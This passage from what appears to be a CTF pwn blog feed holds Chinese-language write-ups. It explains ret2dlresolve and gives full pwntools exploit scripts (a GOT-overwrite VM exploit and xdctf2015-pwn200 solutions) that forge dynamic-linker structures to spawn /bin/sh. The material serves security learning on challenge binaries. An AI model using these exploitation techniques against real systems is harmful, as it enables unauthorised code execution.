class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10   setvbuf@got</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6    #mem[0]-&gt;reg[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30b90</span>, <span class="comment"># 10  根据libc修改</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3     reg[0]-=reg[1]</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7      mem[0]=reg[0]</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10  malloc@got</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x401270</span>, <span class="comment"># 10   trigger  setvbuf</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7   mem[0]&lt;-reg[1]</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7   mem[1]&lt;-reg[2]清空malloc高地址</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10   &amp;stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10  save &#x27;sh&#x27;</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10  &#x27;sh&#x27;</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mem[0]&lt;-reg[0]  </span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7    mem[1]&lt;-reg[2]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7    mem[2]&lt;-reg[1]</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10   clear mem</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6      trigger malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>some_rop</title>
      <link href="/posts/57744/"/>
      <url>/posts/57744/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dl"><a href="#ret2dl" class="headerlink" title="ret2dl"></a>ret2dl</h1><p>一些前置知识见elf动态链接.md</p><hr><p>ret2dlresolve的情况更多适用于没有打印函数的程序</p><p>毕竟如果有打印函数,且有完成ret2dl的条件,那不如直接用ret2libc等方法</p><h2 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h2><h3 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>但_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc/elf/dl-runtime.c实现的</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="思路-1-直接控制重定位表项的相关内容"><a href="#思路-1-直接控制重定位表项的相关内容" class="headerlink" title="思路 1 - 直接控制重定位表项的相关内容"></a>思路 1 - 直接控制重定位表项的相关内容</h3><p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 <code>.dynstr</code>，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。</p><p>此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p><p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p><p><strong>即伪造一个全新的表项,截取调用resolve来触发</strong></p><h3 id="思路-2-间接控制重定位表项的相关内容"><a href="#思路-2-间接控制重定位表项的相关内容" class="headerlink" title="思路 2 - 间接控制重定位表项的相关内容"></a>思路 2 - 间接控制重定位表项的相关内容</h3><p>既然动态链接器会从 <code>.dynamic</code> 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p><p><strong>即修改<code>.dynamic</code>的内容间接控制重定位表项</strong></p><h3 id="思路-3-伪造-link-map"><a href="#思路-3-伪造-link-map" class="headerlink" title="思路 3 - 伪造 link_map"></a>思路 3 - 伪造 link_map</h3><p>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p><p><strong>即修改GOT[1]伪造整个link_map(较难实现),又或者伪造link_map的部分l_info指针使其索引至伪造区域</strong></p><h2 id="64与32的一些差异"><a href="#64与32的一些差异" class="headerlink" title="64与32的一些差异"></a>64与32的一些差异</h2><ol><li><p>首先二者的<code>Elf_Rela</code>和<code>Elf_Dyn</code>结构体存在一些差异</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf32_Sym struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x4</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span> st_name dd ?                            ; offset (<span class="number">0804824</span>C)</span><br><span class="line"><span class="number">00000004</span> st_value dd ?                           ; offset (<span class="number">00000000</span>)</span><br><span class="line"><span class="number">00000008</span> st_size dd ?</span><br><span class="line"><span class="number">0000000</span>C st_info db ?</span><br><span class="line"><span class="number">0000000</span>D st_other db ?</span><br><span class="line"><span class="number">0000000</span>E st_shndx dw ?</span><br><span class="line"><span class="number">00000010</span> Elf32_Sym ends</span><br><span class="line">    </span><br><span class="line"><span class="number">00000000</span> Elf64_Sym struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span> st_name dd ?                            ; offset (<span class="number">00400378</span>)</span><br><span class="line"><span class="number">00000004</span> st_info db ?</span><br><span class="line"><span class="number">00000005</span> st_other db ?</span><br><span class="line"><span class="number">00000006</span> st_shndx dw ?</span><br><span class="line"><span class="number">00000008</span> st_value dq ?                           ; offset (<span class="number">00000000</span>)</span><br><span class="line"><span class="number">00000010</span> st_size dq ?</span><br><span class="line"><span class="number">00000018</span> Elf64_Sym ends</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf32_Rel struc ; (<span class="keyword">sizeof</span>=<span class="number">0x8</span>, align=<span class="number">0x4</span>, copyof_2)</span><br><span class="line"><span class="number">00000000</span> r_offset dd ?</span><br><span class="line"><span class="number">00000004</span> r_info dd ?</span><br><span class="line"><span class="number">00000008</span> Elf32_Rel ends</span><br><span class="line">    </span><br><span class="line"><span class="number">00000000</span> Elf64_Rela struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, copyof_2)</span><br><span class="line"><span class="number">00000000</span> r_offset dq ?</span><br><span class="line"><span class="number">00000008</span> r_info dq ?</span><br><span class="line"><span class="number">00000010</span> r_addend dq ?</span><br><span class="line"><span class="number">00000018</span> Elf64_Rela ends    </span><br></pre></td></tr></table></figure></li><li><p>_dl_runtime_resolve的第二个参数,在32位中是该函数表项相对.rel.plt的字节偏移,而在64位中是该函数表项相对.rel.plt的下标索引</p></li><li>64位下还会验证DT_VERSYM,使用符号表索引作为版本号索引寻找版本号,需要将其置零以绕过检查</li><li>64位下dl_resolve的参数依然使用栈传递,dl_fixup则寄存器传递</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015-pwn200"></a>xdctf2015-pwn200</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wiki将其按照relro等级编译讲解</p><h4 id="no-relro"><a href="#no-relro" class="headerlink" title="no relro"></a>no relro</h4><p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p><ol><li>修改 .dynamic 节中字符串表的地址为伪造的地址</li><li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li><li>在特定的位置读取 /bin/sh 字符串。</li><li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。从这里也可以看出,只要能控制返回流,就算函数已经被解析也可以使用来ret2dl</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>,<span class="built_in">len</span>((dynstr))) <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x08048376</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x080498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="partial-relro"><a href="#partial-relro" class="headerlink" title="partial relro"></a>partial relro</h4><p>在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时可以通过伪造重定位表项的方式来调用目标函数。</p><p>即在指定地址处依次伪造好某一个函数动态链接对应的rel,sym,str</p><p>并以此得到一个rel的下标</p><p>然后直接返回到plt公共表项,那么dl的第二个参数就可以由我们直接在栈中布置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28525)#***</span></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr+=align</span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#字符串位置dynstr</span></span><br><span class="line"></span><br><span class="line">st_info=<span class="number">12</span></span><br><span class="line"></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)<span class="comment">#对应dynsym</span></span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>   <span class="comment">#偏移是下标偏移</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type)</span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span>    <span class="comment">#32位偏移是地址偏移,64位则是下标偏移</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#对应rel</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) </span><br><span class="line">payload1+=p32(four_pop_ret)</span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">b&#x27;abcd&#x27;</span><span class="comment">#调用函数返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#指向binsh</span></span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span>   <span class="comment">#</span></span><br><span class="line">payload2+=<span class="string">b&#x27;bbbb&#x27;</span>   <span class="comment">#read有三个参数</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h3><p>题目很明显只有栈溢出漏洞，没有泄露函数，没有canary、pie，考虑使用ret2resolve，是经典的利用手法。</p><p>题目编译使用的较老的GCC-5.4.0编译的，使得dynamic段的RELA和JMPREL合并成一个段，但是dl_fixup函数中会用到JMPREL，所以需要额外的恢复DT_JMPREL的值。之后就是用题目给的gadget完成利用。</p><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>题目给了两个gadget：<br><strong>gadget1</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400606</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其可以不断深入解引用指针,并可以将解引用出的内容写到指定内存中</p><p>在该题我们可以利用DT_debug表项,找到_r_debug全局结构体,再由_r_debug结构体<strong>找到elf的link_map</strong>,再由elf的link_map用两次l_next找到libc的link_map,再由link_map的l_info[DT_PLTGOT]表项找到libc的.got.plt,然后最后可以在libc的.got.plt公共表项中<strong>找到resolve的地址</strong></p><p><strong>gadget2</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_40067C</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( qword_601030 != <span class="number">0xDEADBEEF</span>LL || qword_601030 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xBEEFDEAD</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( qword_601030 == <span class="number">0xBEEFDEAD</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      result = a3;</span><br><span class="line">      *(_QWORD *)(qword_601028[a1] + <span class="number">8LL</span> * a2) = a3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601040 = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该gadget可以修改内存上的一个指针指向的区域的内容</p><p>我们可以利用其修改在上一个gadget中被我们写入内存的link_map</p><p>以恢复link_map的DT_JMPREL以及置零DT_Versym</p><h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><ol><li>将magicnumber覆盖成0xbeefdead，实现初始化sea.head为dt_debug。将栈迁移到bss</li><li>通过gadget1获取linkmap和resolver地址，并将其写到任意地址。</li><li>通过gadget2修改linkmap的内容，bypass versym和JMPRel。</li><li>伪造dynrela、dynsym、dynstr</li><li>劫持执行流到resolver，调用resolver获取shell。</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 